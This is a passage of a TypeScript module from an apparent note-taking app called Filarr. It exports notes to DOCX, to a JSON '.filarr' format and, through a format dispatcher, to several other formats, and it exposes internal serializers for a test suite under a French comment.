  if (tipTapDoc) {
    children.push(...nodeToDocxParagraphs(tipTapDoc));
  } else {
    // Fallback to plainText
    for (const line of (note.plainText || '').split('\n').filter((l) => l.trim())) {
      children.push(new Paragraph({ children: [new TextRun({ text: line, size: 22 })] }));
    }
  }

  const docxDoc = new Document({ sections: [{ children }] });
  const buffer = await Packer.toBlob(docxDoc);
  return {
    blob: buffer,
    filename: `${sanitizeFilename(note.title)}.docx`,
    mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  };
}

/**
 * Export note to Filarr JSON format (full metadata + content + links).
 */
export function exportToFilarr(note: Note): ExportResult {
  const data = {
    version: 1,
    exportedAt: new Date().toISOString(),
    note: {
      id: note.id,
      title: note.title,
      content: note.content,
      plainText: note.plainText,
      linkedNoteIds: note.linkedNoteIds,
      linkedFileIds: note.linkedFileIds,
      linkedFolderIds: note.linkedFolderIds,
      isDaily: note.isDaily,
      dailyDate: note.dailyDate,
      icon: note.icon,
      coverColor: note.coverColor,
      wordCount: note.wordCount,
      isPinned: note.isPinned,
      createdAt: note.createdAt,
      updatedAt: note.updatedAt,
    },
  };

  const blob = new Blob([JSON.stringify(data, null, 2)], {
    type: 'application/json;charset=utf-8',
  });
  return {
    blob,
    filename: `${sanitizeFilename(note.title)}.filarr`,
    mimeType: 'application/json',
  };
}

/**
 * Export a note in the specified format.
 */
export async function exportNote(note: Note, options: ExportOptions): Promise<ExportResult> {
  switch (options.format) {
    case 'markdown':
      return exportToMarkdown(note, options);
    case 'html':
      return exportToHTML(note, options);
    case 'pdf':
      return exportToPDF(note, options);
    case 'docx':
      return exportToDOCX(note, options);
    case 'filarr':
      return exportToFilarr(note);
    default:
      throw new Error(`Unsupported export format: ${options.format}`);
  }
}

/**
 * SURFACE D'ÉPREUVE — sérialiseurs internes, exposés pour la seule suite de
 * couverture (`__tests__/noteExportCoverage.vitest.ts`).
 *
 * Aucun appelant applicatif ne doit passer par là : les points d'entrée sont
 * les `exportToXxx`. Les quatre fonctions sont ici parce qu'il n'y a pas
 * d'autre façon d'éprouver la FIDÉLITÉ bloc par bloc — un .pdf ou un .docx
 * empaqueté ne se relit pas, et c'est cette opacité qui a laissé la
 * divergence prospérer.
 */
export const __exportSerializers = {
  nodeToMarkdown,
  nodeToHtml,
  nodeToPdfLines,
  nodeToDocxBlocks,
};
